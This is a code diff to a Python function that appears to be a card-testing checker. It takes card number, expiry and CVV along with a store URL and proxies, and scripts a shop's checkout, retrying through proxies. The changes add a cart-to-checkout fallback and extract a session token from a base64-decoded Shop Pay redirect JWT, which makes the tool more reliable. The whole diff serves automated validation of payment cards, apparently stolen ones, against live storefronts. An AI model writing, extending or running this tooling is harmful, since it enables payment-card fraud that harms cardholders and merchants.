@@ -13,7 +13,8 @@ import re
 import random
 import time
 import os
-from urllib.parse import urlparse
+import base64
+from urllib.parse import urlparse, parse_qs
 
 
 
@@ -325,15 +326,26 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 # Step 2: Get checkout page
                 print(f"[{attempt}] [STEP 3] Entering checkout...")
                 checkout_resp = await session.post(
-                    f"{ourl}/checkout/",
+                    f"{ourl}/cart",
+                    data={"checkout": "Check out"},
                     allow_redirects=True,
-                    headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                     proxies=curl_proxies,
                 )
                 print(f"[{attempt}] [CHECKOUT] Status: {checkout_resp.status_code}")
                 checkout_url = str(checkout_resp.url)
                 print(f"[{attempt}] [INFO] Checkout URL: {checkout_url}")
                 text = checkout_resp.text
+
+                # Fallback to direct /checkout/ if /cart didn't produce checkout
+                if "checkouts" not in checkout_url.lower() and checkout_resp.status_code != 200:
+                    checkout_resp = await session.post(
+                        f"{ourl}/checkout/",
+                        allow_redirects=True,
+                        headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+                        proxies=curl_proxies,
+                    )
+                    checkout_url = str(checkout_resp.url)
+                    text = checkout_resp.text
 
                 if "login" in checkout_url.lower():
                     print(f"[{attempt}] [ISSUE] Login required.")
@@ -346,6 +358,19 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                 if not sst: sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                 if not sst: sst = extract_between(text, '"serializedSessionToken":"', '"')
                 if not sst: sst = extract_between(text, '"sessionToken":"', '"')
+
+                # Fallback: extract session token from Shop Pay redirect JWT if present
+                if not sst and "shop_pay_token=" in checkout_url:
+                    try:
+                        parsed_url = urlparse(checkout_url)
+                        qs = parse_qs(parsed_url.query)
+                        spt = qs.get("shop_pay_token", [""])[0]
+                        if spt and "." in spt:
+                            payload_raw = spt.split(".")[1]
+                            payload_json = json.loads(base64.urlsafe_b64decode(payload_raw + "=="))
+                            sst = payload_json.get("session_token")
+                    except Exception:
+                        pass
 
                 if not sst:
                     print(f"[{attempt}] [ISSUE] No session token.")
